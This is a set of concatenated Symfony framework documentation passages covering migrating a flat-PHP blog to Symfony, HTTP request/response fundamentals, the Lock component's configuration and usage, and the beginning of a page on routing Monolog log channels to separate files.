recognize that the list page - ``/index.php``  - should be accessible also via ``/``
(if Apache rewrite rules were added). Also, instead of developing the blog,
a lot of time is being spent working on the "architecture" of the code (e.g.
routing, calling controllers, templates, etc.). More time will need to be
spent to handle form submissions, input validation, logging and security.
Why should you have to reinvent solutions to all these routine problems?

.. _add-a-touch-of-symfony2:

Add a Touch of Symfony
~~~~~~~~~~~~~~~~~~~~~~

Symfony to the rescue. Before actually using Symfony, you need to download
it. This can be done by using `Composer`_, which takes care of downloading the
correct version and all its dependencies and provides an autoloader. An
autoloader is a tool that makes it possible to start using PHP classes
without explicitly including the file containing the class.

In your root directory, create a ``composer.json`` file with the following
content:

.. code-block:: json

    {
        "require": {
            "symfony/http-foundation": "^4.0"
        },
        "autoload": {
            "files": ["model.php","controllers.php"]
        }
    }

Next, `download Composer`_ and then run the following command, which will download Symfony
into a ``vendor/`` directory:

.. code-block:: terminal

    $ composer install

Beside downloading your dependencies, Composer generates a ``vendor/autoload.php`` file,
which takes care of autoloading for all the files in the Symfony Framework as well as
the files mentioned in the autoload section of your ``composer.json``.

Core to Symfony's philosophy is the idea that an application's main job is
to interpret each request and return a response. To this end, Symfony provides
both a :class:`Symfony\\Component\\HttpFoundation\\Request` and a
:class:`Symfony\\Component\\HttpFoundation\\Response` class. These classes are
object-oriented representations of the raw HTTP request being processed and
the HTTP response being returned. Use them to improve the blog::

    // index.php
    require_once 'vendor/autoload.php';

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    $request = Request::createFromGlobals();

    $uri = $request->getPathInfo();
    if ('/' === $uri) {
        $response = list_action();
    } elseif ('/show' === $uri && $request->query->has('id')) {
        $response = show_action($request->query->get('id'));
    } else {
        $html = '<html><body><h1>Page Not Found</h1></body></html>';
        $response = new Response($html, Response::HTTP_NOT_FOUND);
    }

    // echo the headers and send the response
    $response->send();

The controllers are now responsible for returning a ``Response`` object.
To make this easier, you can add a new ``render_template()`` function, which,
incidentally, acts quite a bit like the Symfony templating engine::

    // controllers.php
    use Symfony\Component\HttpFoundation\Response;

    function list_action()
    {
        $posts = get_all_posts();
        $html = render_template('templates/list.php', ['posts' => $posts]);

        return new Response($html);
    }

    function show_action($id)
    {
        $post = get_post_by_id($id);
        $html = render_template('templates/show.php', ['post' => $post]);

        return new Response($html);
    }

    // helper function to render templates
    function render_template($path, array $args)
    {
        extract($args);
        ob_start();
        require $path;
        $html = ob_get_clean();

        return $html;
    }

By bringing in a small part of Symfony, the application is more flexible and
reliable. The ``Request`` provides a dependable way to access information
about the HTTP request. Specifically, the
:method:`Symfony\\Component\\HttpFoundation\\Request::getPathInfo` method returns
a cleaned URI (always returning ``/show`` and never ``/index.php/show``).
So, even if the user goes to ``/index.php/show``, the application is intelligent
enough to route the request through ``show_action()``.

The ``Response`` object gives flexibility when constructing the HTTP response,
allowing HTTP headers and content to be added via an object-oriented interface.
And while the responses in this application are simple, this flexibility
will pay dividends as your application grows.

.. _the-sample-application-in-symfony2:

The Sample Application in Symfony
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The blog has come a *long* way, but it still contains a lot of code for such
a basic application. Along the way, you've made a basic routing system and
a function using ``ob_start()`` and ``ob_get_clean()`` to render templates.
If, for some reason, you needed to continue building this "framework" from
scratch, you could at least use Symfony's standalone :doc:`Routing </routing>`
component and :doc:`Twig </templates>`, which already solve these problems.

Instead of re-solving common problems, you can let Symfony take care of
them for you. Here's the same sample application, now built in Symfony::

    // src/Controller/BlogController.php
    namespace App\Controller;

    use App\Entity\Post;
    use Doctrine\Persistence\ManagerRegistry;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;

    class BlogController extends AbstractController
    {
        public function list(ManagerRegistry $doctrine)
        {
            $posts = $doctrine->getRepository(Post::class)->findAll();

            return $this->render('blog/list.html.twig', ['posts' => $posts]);
        }

        public function show(ManagerRegistry $doctrine, $id)
        {
            $post = $doctrine->getRepository(Post::class)->find($id);

            if (!$post) {
                // cause the 404 page not found to be displayed
                throw $this->createNotFoundException();
            }

            return $this->render('blog/show.html.twig', ['post' => $post]);
        }
    }

Notice, both controller functions now live inside a "controller class". This is a
nice way to group related pages. The controller functions are also sometimes called
*actions*.

The two controllers (or actions) are still lightweight. Each uses the
:doc:`Doctrine ORM library </doctrine>` to retrieve objects from the
database and Twig to render a template and return a ``Response`` object.
The ``list.html.twig`` template is now quite a bit simpler, and uses Twig:

.. code-block:: html+twig

    {# templates/blog/list.html.twig #}
    {% extends 'base.html.twig' %}

    {% block title %}List of Posts{% endblock %}

    {% block body %}
    <h1>List of Posts</h1>
    <ul>
        {% for post in posts %}
        <li>
            <a href="{{ path('blog_show', { id: post.id }) }}">
                {{ post.title }}
            </a>
        </li>
        {% endfor %}
    </ul>
    {% endblock %}

The ``layout.php`` file is nearly identical:

.. code-block:: html+twig

    <!-- templates/base.html.twig -->
    <!DOCTYPE html>
    <html>
        <head>
            <meta charset="UTF-8">
            <title>{% block title %}Welcome!{% endblock %}</title>
            {% block stylesheets %}{% endblock %}
            {% block javascripts %}{% endblock %}
        </head>
        <body>
            {% block body %}{% endblock %}
        </body>
    </html>

.. note::

    The ``show.html.twig`` template is left as an exercise: updating it should be
    really similar to updating the ``list.html.twig`` template.

When Symfony's engine (called the Kernel) boots up, it needs a map so
that it knows which controllers to call based on the request information.
A routing configuration map - ``config/routes.yaml`` - provides this information
in a readable format:

.. code-block:: yaml

    # config/routes.yaml
    blog_list:
        path:     /blog
        controller: App\Controller\BlogController::list

    blog_show:
        path:     /blog/show/{id}
        controller: App\Controller\BlogController::show

Now that Symfony is handling all the mundane tasks, the front controller
``public/index.php`` is reduced to bootstrapping. And since it does so little, you'll never
have to touch it::

    // public/index.php
    require_once __DIR__.'/../app/bootstrap.php';
    require_once __DIR__.'/../src/Kernel.php';

    use Symfony\Component\HttpFoundation\Request;

    $kernel = new Kernel('prod', false);
    $kernel->handle(Request::createFromGlobals())->send();

The front controller's only job is to initialize Symfony's engine (called the
Kernel) and pass it a ``Request`` object to handle. The Symfony core
asks the router to inspect the request. The router matches the incoming URL
to a specific route and returns information about the route, including the
controller that should be called. The correct controller from the matched
route is called and your code inside the controller creates and returns the
appropriate ``Response`` object. The HTTP headers and content of the ``Response``
object are sent back to the client.

It's a beautiful thing.

.. raw:: html

    <object data="../_images/http/request-flow.svg" type="image/svg+xml"
        alt="A flow diagram visualizing the previously described process from front controller to response."
    ></object>

Where Symfony Delivers
----------------------

In the rest of the documentation articles, you'll learn more about how each piece of
Symfony works and how you can organize your project. For now, celebrate how
migrating the blog from flat PHP to Symfony has improved your life:

* Your application now has **clear and consistently organized code** (though
  Symfony doesn't force you into this). This promotes **reusability** and
  allows for new developers to be productive in your project more quickly;

* 100% of the code you write is for *your* application. You **don't need
  to develop or maintain low-level utilities** such as autoloading,
  :doc:`routing </routing>`, or rendering :doc:`controllers </controller>`;

* Symfony gives you **access to open source tools** such as `Doctrine`_ and the
  `Twig`_, :doc:`Security </security>`, :doc:`Form </components/form>`,
  `Validator`_ and `Translation`_ components (to name a few);

* The application now enjoys **fully-flexible URLs** thanks to the Routing
  component;

* Symfony's HTTP-centric architecture gives you access to powerful tools
  such as **HTTP caching** powered by **Symfony's internal HTTP cache** or
  more powerful tools such as `Varnish`_. This is covered in another article
  all about :doc:`caching </http_cache>`.

And perhaps best of all, by using Symfony, you now have access to a whole
set of **high-quality open source tools developed by the Symfony community**!
A good selection of `Symfony community tools`_ can be found on GitHub.

.. _`Model-View-Controller`: https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller
.. _`Doctrine`: https://www.doctrine-project.org/
.. _Twig: https://github.com/twigphp/twig
.. _Translation: https://github.com/symfony/translation
.. _`Composer`: https://getcomposer.org
.. _`download Composer`: https://getcomposer.org/download/
.. _`Validator`: https://github.com/symfony/validator
.. _`Varnish`: https://varnish-cache.org/
.. _`Symfony community tools`: https://github.com/search?q=topic%3Asymfony-bundle&type=Repositories
.. _symfony2-and-http-fundamentals:

Symfony and HTTP Fundamentals
=============================

Great news! While you're learning Symfony, you're *also* learning the fundamentals
of the *web*. Symfony is closely modeled after the HTTP Request-Response flow: that
*fundamental* paradigm that's behind almost *all* communication on the web.

In this article, you'll walk through the HTTP fundamentals and find out how these
are applied throughout Symfony.

Requests and Responses in HTTP
------------------------------

HTTP (Hypertext Transfer Protocol) is a text language that allows two machines
to communicate with each other. For example, when checking for the latest
`xkcd`_ comic, the following (approximate) conversation takes place:

.. raw:: html

    <object data="../_images/http/xkcd-full.svg" type="image/svg+xml"
        alt="A sequence diagram showing the browser sending &quot;Can I see today's comic?&quot; to the xkcd server. The server prepares the page's HTML and sents it back to the browser."
    ></object>

HTTP is the term used to describe this text-based language. The goal of
your server is *always* to understand text requests and return text responses.

Symfony is built from the ground up around that reality. Whether you realize
it or not, HTTP is something you use every day. With Symfony, you'll learn
how to master it.

Step 1: The Client Sends a Request
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Every conversation on the web starts with a *request*. The request is a text
message created by a client (e.g. a browser, a smartphone app, etc) in a
special format known as HTTP. The client sends that request to a server,
and then waits for the response.

Take a look at the first part of the interaction (the request) between a
browser and the xkcd web server:

.. raw:: html

    <object data="../_images/http/xkcd-request.svg" type="image/svg+xml"
        alt="A sequence diagram showing the request from browser to the xkcd server."
    ></object>

In HTTP-speak, this HTTP request would actually look something like this:

.. code-block:: text

    GET / HTTP/1.1
    Host: xkcd.com
    Accept: text/html
    User-Agent: Mozilla/5.0 (Macintosh)

These few lines communicate *everything* necessary about exactly which
resource the client is requesting. The first line of an HTTP request is the
most important, because it contains two important things: the HTTP method (GET)
and the URI (``/``).

The URI (e.g. ``/``, ``/contact``, etc) is the unique address or location
that identifies the resource the client wants. The HTTP method (e.g. ``GET``)
defines what the client wants to *do* with the resource. The HTTP methods (also
known as verbs) define the few common ways that the client can act upon the
resource - the most common HTTP methods are:

**GET**
    Retrieve the resource from the server (e.g. when visiting a page);
**POST**
    Create a resource on the server (e.g. when submitting a form);
**PUT**/**PATCH**
    Update the resource on the server (used by APIs);
**DELETE**
    Delete the resource from the server (used by APIs).

With this in mind, you can imagine what an HTTP request might look like to
delete a specific blog post, for example:

.. code-block:: text

    DELETE /blog/15 HTTP/1.1

.. note::

    There are actually nine HTTP methods defined by the HTTP specification,
    but many of them are not widely used or supported. In reality, many
    modern browsers only support ``POST`` and ``GET`` in HTML forms. Various
    others are however supported in `XMLHttpRequest`_.

In addition to the first line, an HTTP request invariably contains other
lines of information called request **headers**. The headers can supply a wide
range of information such as the host of the resource being requested (``Host``),
the response formats the client accepts (``Accept``) and the application the
client is using to make the request (``User-Agent``). Many other headers exist
and can be found on Wikipedia's `List of HTTP header fields`_ article.

Step 2: The Server Returns a Response
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Once a server has received the request, it knows exactly which resource the
client needs (via the URI) and what the client wants to do with that resource
(via the method). For example, in the case of a GET request, the server
prepares the resource and returns it in an HTTP response. Consider the response
from the xkcd web server:

.. raw:: html

    <object data="../_images/http/xkcd-full.svg" type="image/svg+xml"
        alt="The full sequence diagram with the xkcd server sending the page's HTML back to the browser."
    ></object>

Translated into HTTP, the response sent back to the browser will look something
like this:

.. code-block:: text

    HTTP/1.1 200 OK
    Date: Sat, 02 Apr 2011 21:05:05 GMT
    Server: lighttpd/1.4.19
    Content-Type: text/html

    <html>
        <!-- ... HTML for the xkcd comic -->
    </html>

The HTTP response contains the requested resource (the HTML content in this
case), as well as other information about the response. The first line is
especially important and contains the HTTP response status code (200 in this
case).

The status code communicates the overall outcome of the request back to the
client. Was the request successful? Was there an error? Different status codes
exist that indicate success, an error or that the client needs to do something
(e.g. redirect to another page). Check out the `list of HTTP status codes`_.

Like the request, an HTTP response contains additional pieces of information
known as HTTP headers. The body of the same resource could be returned in multiple
different formats like HTML, XML or JSON and the ``Content-Type`` header uses
Internet Media Types like ``text/html`` to tell the client which format is
being returned. You can see a `List of common media types`_ from IANA.

Many other headers exist, some of which are very powerful. For example, certain
headers can be used to create a powerful caching system.

Requests, Responses and Web Development
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This request-response conversation is the fundamental process that drives all
communication on the web.

The most important fact is this: regardless of the language you use, the
type of application you build (web, mobile, JSON API) or the development
philosophy you follow, the end goal of an application is **always** to understand
each request and create and return the appropriate response.

.. seealso::

    To learn more about the HTTP specification, read the original `HTTP 1.1 RFC`_
    or the `HTTP Bis`_, which is an active effort to clarify the original
    specification.

Requests and Responses in PHP
-----------------------------

So how do you interact with the "request" and create a "response" when using
PHP? In reality, PHP abstracts you a bit from the whole process::

    $uri = $_SERVER['REQUEST_URI'];
    $foo = $_GET['foo'];

    header('Content-Type: text/html');
    echo 'The URI requested is: '.$uri;
    echo 'The value of the "foo" parameter is: '.$foo;

As strange as it sounds, this small application is in fact taking information
from the HTTP request and using it to create an HTTP response. Instead of
parsing the raw HTTP request message, PHP prepares superglobal variables
(such as ``$_SERVER`` and ``$_GET``) that contain all the information from the
request. Similarly, instead of returning the HTTP-formatted text response, you
can use the PHP :phpfunction:`header` function to create response headers and
print out the actual content that will be the content portion of the response
message. PHP will create a true HTTP response and return it to the client:

.. code-block:: text

    HTTP/1.1 200 OK
    Date: Sat, 03 Apr 2011 02:14:33 GMT
    Server: Apache/2.2.17 (Unix)
    Content-Type: text/html

    The URI requested is: /testing?foo=symfony
    The value of the "foo" parameter is: symfony

Requests and Responses in Symfony
---------------------------------

Symfony provides an alternative to the raw PHP approach via two classes that
allow you to interact with the HTTP request and response in an easier way.

Symfony Request Object
~~~~~~~~~~~~~~~~~~~~~~

The :class:`Symfony\\Component\\HttpFoundation\\Request` class is an
object-oriented representation of the HTTP request message. With it, you
have all the request information at your fingertips::

    use Symfony\Component\HttpFoundation\Request;

    $request = Request::createFromGlobals();

    // the URI being requested (e.g. /about) minus any query parameters
    $request->getPathInfo();

    // retrieves $_GET and $_POST variables respectively
    $request->query->get('id');
    $request->getPayload()->get('category', 'default category');

    // retrieves $_SERVER variables
    $request->server->get('HTTP_HOST');

    // retrieves an instance of UploadedFile identified by "attachment"
    $request->files->get('attachment');

    // retrieves a $_COOKIE value
    $request->cookies->get('PHPSESSID');

    // retrieves an HTTP request header, with normalized, lowercase keys
    $request->headers->get('host');
    $request->headers->get('content-type');

    $request->getMethod();    // e.g. GET, POST, PUT, DELETE or HEAD
    $request->getLanguages(); // an array of languages the client accepts

As a bonus, the ``Request`` class does a lot of work in the background about which
you will never need to worry. For example, the ``isSecure()`` method
checks the *three* different values in PHP that can indicate whether or not
the user is connecting via a secure connection (i.e. HTTPS).

Symfony Response Object
~~~~~~~~~~~~~~~~~~~~~~~

Symfony also provides a :class:`Symfony\\Component\\HttpFoundation\\Response`
class: a PHP representation of an HTTP response message. This allows your
application to use an object-oriented interface to construct the response that
needs to be returned to the client::

    use Symfony\Component\HttpFoundation\Response;

    $response = new Response();

    $response->setContent('<html><body><h1>Hello world!</h1></body></html>');
    $response->setStatusCode(Response::HTTP_OK);

    // sets a HTTP response header
    $response->headers->set('Content-Type', 'text/html');

    // prints the HTTP headers followed by the content
    $response->send();

There are also several response *sub-classes* to help you return
:ref:`JSON <component-http-foundation-json-response>`,
:ref:`redirect <redirect-response>`,
:ref:`stream file downloads <component-http-foundation-serving-files>`
and more.

.. tip::

    The ``Request`` and ``Response`` classes are part of a standalone component
    called :doc:`symfony/http-foundation </components/http_foundation>`
    that you can use in *any* PHP project. This also contains classes for handling
    sessions, file uploads and more.

If Symfony offered nothing else, you would already have a toolkit for accessing
request information and an object-oriented interface for creating the response.
Even as you learn the many powerful features in Symfony, keep in mind that the
goal of your application is always *to interpret a request and create the
appropriate response based on your application logic*.

The Journey from the Request to the Response
--------------------------------------------

Like HTTP itself, using the ``Request`` and ``Response`` objects is pretty
straightforward. The hard part of building an application is writing what comes in
between. In other words, the real work comes in writing the code that
interprets the request information and creates the response.

Your application probably does many things, like sending emails, handling
form submissions, saving things to a database, rendering HTML pages and protecting
content with security. How can you manage all of this and still keep your
code organized and maintainable? Symfony was created to help you with these
problems.

The Front Controller
~~~~~~~~~~~~~~~~~~~~

Traditionally, applications were built so that each "page" of a site was
its own physical file (e.g. ``index.php``, ``contact.php``, etc.).

There are several problems with this approach, including the inflexibility
of the URLs (what if you wanted to change ``blog.php`` to ``news.php`` without
breaking all of your links?) and the fact that each file *must* manually
include some set of core files so that security, database connections and
the "look" of the site can remain consistent.

A much better solution is to use a front controller: a single PHP file that
handles every request coming into your application. For example:

+------------------------+------------------------+
| ``/index.php``         | executes ``index.php`` |
+------------------------+------------------------+
| ``/index.php/contact`` | executes ``index.php`` |
+------------------------+------------------------+
| ``/index.php/blog``    | executes ``index.php`` |
+------------------------+------------------------+

.. include:: /_includes/_rewrite_rule_tip.rst.inc

Now, every request is handled exactly the same way. Instead of individual URLs
executing different PHP files, the front controller is *always* executed,
and the routing of different URLs to different parts of your application
is done internally.

A small front controller might look like this::

    // index.php
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    $request = Request::createFromGlobals();
    $path = $request->getPathInfo(); // the URI path being requested

    if (in_array($path, ['', '/'])) {
        $response = new Response('Welcome to the homepage.');
    } elseif ('/contact' === $path) {
        $response = new Response('Contact us');
    } else {
        $response = new Response('Page not found.', Response::HTTP_NOT_FOUND);
    }
    $response->send();

This is better, but this is still a lot of repeated work! Fortunately, Symfony can
help once again.

The Symfony Application Flow
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

A Symfony framework application *also* uses a front-controller file. But inside,
*Symfony* is responsible for handling each incoming request and figuring out what
to do:

.. _request-flow-figure:

.. raw:: html

    <object data="../_images/http/request-flow.svg" type="image/svg+xml"
        alt="A flow diagram visualizing the request-response flow. Each step is written out in text in the next section."
    ></object>

Incoming requests are interpreted by the :doc:`Routing component </routing>` and
passed to PHP functions that return ``Response`` objects.

This may not make sense yet, but as you keep reading, you'll learn about :doc:`routes </routing>`
and :doc:`controllers </controller>`: the two fundamental parts to creating a page.
But as you go along, don't forget that no matter *how* complex your app gets, your
job is always the same: read information from the Request and use it to create a
Response.

Summary: The Request-Response Flow
----------------------------------

Here's what we've learned so far:

#. A client (e.g. a browser) sends an HTTP request;
#. Each request executes the same, single file (called a "front controller");
#. The front controller boots Symfony and passes the request information;
#. Internally, Symfony uses *routes* and *controllers* to create the Response for
   the page (we'll learn about these soon!);
#. Symfony turns your ``Response`` object into the text headers and content
   (i.e. the HTTP response), which are sent back to the client.

.. _`xkcd`: https://xkcd.com/
.. _`XMLHttpRequest`: https://en.wikipedia.org/wiki/XMLHttpRequest
.. _`HTTP 1.1 RFC`: https://www.w3.org/Protocols/rfc2616/rfc2616.html
.. _`HTTP Bis`: https://datatracker.ietf.org/wg/httpbis/
.. _`List of HTTP header fields`: https://en.wikipedia.org/wiki/List_of_HTTP_header_fields
.. _`list of HTTP status codes`: https://en.wikipedia.org/wiki/List_of_HTTP_status_codes
.. _`List of common media types`: https://www.iana.org/assignments/media-types/media-types.xhtml
Dealing with Concurrency with Locks
===================================

When a program runs concurrently, some part of code which modify shared
resources should not be accessed by multiple processes at the same time.
Symfony's :doc:`Lock component </components/lock>` provides a locking mechanism to ensure
that only one process is running the critical section of code at any point of
time to prevent race conditions from happening.

The following example shows a typical usage of the lock::

    $lock = $lockFactory->createLock('pdf-creation');
    if (!$lock->acquire()) {
        return;
    }

    // critical section of code
    $service->method();

    $lock->release();

Installing
----------

In applications using :ref:`Symfony Flex <symfony-flex>`, run this command to
install the Lock component:

.. code-block:: terminal

    $ composer require symfony/lock

Configuring
-----------

By default, Symfony provides a :ref:`Semaphore <lock-store-semaphore>`
when available, or a :ref:`Flock <lock-store-flock>` otherwise. You can configure
this behavior by using the ``lock`` key like:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/lock.yaml
        framework:
            lock: ~
            lock: 'flock'
            lock: 'flock:///path/to/file'
            lock: 'semaphore'
            lock: 'memcached://m1.docker'
            lock: ['memcached://m1.docker', 'memcached://m2.docker']
            lock: 'redis://r1.docker'
            lock: ['redis://r1.docker', 'redis://r2.docker']
            lock: 'rediss://r1.docker?ssl[verify_peer]=1&ssl[cafile]=...'
            lock: 'zookeeper://z1.docker'
            lock: 'zookeeper://z1.docker,z2.docker'
            lock: 'zookeeper://localhost01,localhost02:2181'
            lock: 'sqlite:///%kernel.project_dir%/var/lock.db'
            lock: 'mysql:host=127.0.0.1;dbname=app'
            lock: 'pgsql:host=127.0.0.1;dbname=app'
            lock: 'pgsql+advisory:host=127.0.0.1;dbname=app'
            lock: 'sqlsrv:server=127.0.0.1;Database=app'
            lock: 'oci:host=127.0.0.1;dbname=app'
            lock: 'mongodb://127.0.0.1/app?collection=lock'
            lock: '%env(LOCK_DSN)%'

            # named locks
            lock:
                invoice: ['semaphore', 'redis://r2.docker']
                report: 'semaphore'

    .. code-block:: xml

        <!-- config/packages/lock.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:lock>
                    <framework:resource>flock</framework:resource>

                    <framework:resource>flock:///path/to/file</framework:resource>

                    <framework:resource>semaphore</framework:resource>

                    <framework:resource>memcached://m1.docker</framework:resource>

                    <framework:resource>memcached://m1.docker</framework:resource>
                    <framework:resource>memcached://m2.docker</framework:resource>

                    <framework:resource>redis://r1.docker</framework:resource>

                    <framework:resource>redis://r1.docker</framework:resource>
                    <framework:resource>redis://r2.docker</framework:resource>

                    <framework:resource>zookeeper://z1.docker</framework:resource>

                    <framework:resource>zookeeper://z1.docker,z2.docker</framework:resource>

                    <framework:resource>zookeeper://localhost01,localhost02:2181</framework:resource>

                    <framework:resource>sqlite:///%kernel.project_dir%/var/lock.db</framework:resource>

                    <framework:resource>mysql:host=127.0.0.1;dbname=app</framework:resource>

                    <framework:resource>pgsql:host=127.0.0.1;dbname=app</framework:resource>

                    <framework:resource>pgsql+advisory:host=127.0.0.1;dbname=app</framework:resource>

                    <framework:resource>sqlsrv:server=127.0.0.1;Database=app</framework:resource>

                    <framework:resource>oci:host=127.0.0.1;dbname=app</framework:resource>

                    <framework:resource>mongodb://127.0.0.1/app?collection=lock</framework:resource>

                    <framework:resource>%env(LOCK_DSN)%</framework:resource>

                    <!-- named locks -->
                    <framework:resource name="invoice">semaphore</framework:resource>
                    <framework:resource name="invoice">redis://r2.docker</framework:resource>
                    <framework:resource name="report">semaphore</framework:resource>
                </framework:lock>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/lock.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->lock()
                ->resource('default', ['flock'])
                ->resource('default', ['flock:///path/to/file'])
                ->resource('default', ['semaphore'])
                ->resource('default', ['memcached://m1.docker'])
                ->resource('default', ['memcached://m1.docker', 'memcached://m2.docker'])
                ->resource('default', ['redis://r1.docker'])
                ->resource('default', ['redis://r1.docker', 'redis://r2.docker'])
                ->resource('default', ['zookeeper://z1.docker'])
                ->resource('default', ['zookeeper://z1.docker,z2.docker'])
                ->resource('default', ['zookeeper://localhost01,localhost02:2181'])
                ->resource('default', ['sqlite:///%kernel.project_dir%/var/lock.db'])
                ->resource('default', ['mysql:host=127.0.0.1;dbname=app'])
                ->resource('default', ['pgsql:host=127.0.0.1;dbname=app'])
                ->resource('default', ['pgsql+advisory:host=127.0.0.1;dbname=app'])
                ->resource('default', ['sqlsrv:server=127.0.0.1;Database=app'])
                ->resource('default', ['oci:host=127.0.0.1;dbname=app'])
                ->resource('default', ['mongodb://127.0.0.1/app?collection=lock'])
                ->resource('default', [env('LOCK_DSN')])

                // named locks
                ->resource('invoice', ['semaphore', 'redis://r2.docker'])
                ->resource('report', ['semaphore'])
            ;
        };

Locking a Resource
------------------

To lock the default resource, autowire the lock factory using
:class:`Symfony\\Component\\Lock\\LockFactory`::

    // src/Controller/PdfController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Lock\LockFactory;

    class PdfController extends AbstractController
    {
        #[Route('/download/terms-of-use.pdf')]
        public function downloadPdf(LockFactory $factory, MyPdfGeneratorService $pdf): Response
        {
            $lock = $factory->createLock('pdf-creation');
            $lock->acquire(true);

            // heavy computation
            $myPdf = $pdf->getOrCreatePdf();

            $lock->release();

            // ...
        }
    }

.. caution::

    The same instance of ``LockInterface`` won't block when calling ``acquire``
    multiple times inside the same process. When several services use the
    same lock, inject the ``LockFactory`` instead to create a separate lock
    instance for each service.

Locking a Dynamic Resource
--------------------------

Sometimes the application is able to cut the resource into small pieces in order
to lock a small subset of processes and let others through. The previous example
showed how to lock the ``$pdf->getOrCreatePdf()`` call for everybody,
now let's see how to lock a ``$pdf->getOrCreatePdf($version)`` call only for
processes asking for the same ``$version``::

    // src/Controller/PdfController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Lock\LockFactory;

    class PdfController extends AbstractController
    {
        #[Route('/download/{version}/terms-of-use.pdf')]
        public function downloadPdf($version, LockFactory $lockFactory, MyPdfGeneratorService $pdf): Response
        {
            $lock = $lockFactory->createLock('pdf-creation-'.$version);
            $lock->acquire(true);

            // heavy computation
            $myPdf = $pdf->getOrCreatePdf($version);

            $lock->release();

            // ...
        }
    }

.. _lock-named-locks:

Naming Locks
------------

If the application needs different kind of Stores alongside each other, Symfony
provides :ref:`named lock <reference-lock-resources-name>`:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/lock.yaml
        framework:
            lock:
                invoice: ['semaphore', 'redis://r2.docker']
                report: 'semaphore'

    .. code-block:: xml

        <!-- config/packages/lock.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:lock>
                    <framework:resource name="invoice">semaphore</framework:resource>
                    <framework:resource name="invoice">redis://r2.docker</framework:resource>
                    <framework:resource name="report">semaphore</framework:resource>
                </framework:lock>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/lock.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->lock()
                ->resource('invoice', ['semaphore', 'redis://r2.docker'])
                ->resource('report', ['semaphore']);
            ;
        };

An autowiring alias is created for each named lock with a name using the camel
case version of its name suffixed by ``LockFactory``.

For instance, the ``invoice`` lock can be injected by naming the argument
``$invoiceLockFactory`` and type-hinting it with
:class:`Symfony\\Component\\Lock\\LockFactory`::

    // src/Controller/PdfController.php
    namespace App\Controller;

    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Lock\LockFactory;

    class PdfController extends AbstractController
    {
        #[Route('/download/terms-of-use.pdf')]
        public function downloadPdf(LockFactory $invoiceLockFactory, MyPdfGeneratorService $pdf): Response
        {
            // ...
        }
    }
How to Log Messages to different Files
======================================

The Symfony Framework organizes log messages into channels. By default, there
are several channels, including ``doctrine``, ``event``, ``security``, ``request``
and more. The channel is printed in the log message and can also be used
to direct different channels to different places/files.

By default, Symfony logs every message into a single file (regardless of
the channel).

.. note::

    Each channel corresponds to a different logger service (``monolog.logger.XXX``)
    Use the ``php bin/console debug:container monolog`` command to see a full
    list of services and learn :ref:`how to autowire monolog channels <monolog-autowire-channels>`.

.. _logging-channel-handler:

Switching a Channel to a different Handler
------------------------------------------

Now, suppose you want to log the ``security`` channel to a different file.
To do this, create a new handler and configure it to log only messages
from the ``security`` channel. The following example does that only in the
``prod`` :ref:`configuration environment <configuration-environments>`:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/monolog.yaml
        when@prod:
            monolog:
                handlers:
                    security:
                        # log all messages (since debug is the lowest level)
                        level:    debug
                        type:     stream
                        path:     '%kernel.logs_dir%/security.log'
                        channels: [security]

                    # an example of *not* logging security channel messages for this handler
                    main:
                        # ...
                        # channels: ['!security']

    .. code-block:: xml

        <!-- config/packages/prod/monolog.xml-->
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:monolog="http://symfony.com/schema/dic/monolog"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/monolog
                https://symfony.com/schema/dic/monolog/monolog-1.0.xsd">

            <when env="prod">
                <monolog:config>
                    <monolog:handler name="security" type="stream" path="%kernel.logs_dir%/security.log">
                        <monolog:channels>
                            <monolog:channel>security</monolog:channel>
                        </monolog:channels>
                    </monolog:handler>
                </monolog:config>
            </when>

                <monolog:handler name="main" type="stream" path="%kernel.logs_dir%/main.log">
                    <!-- ... -->
                    <monolog:channels>
                        <monolog:channel>!security</monolog:channel>
                    </monolog:channels>
                </monolog:handler>
            </monolog:config>
        </container>

    .. code-block:: php

        // config/packages/prod/monolog.php
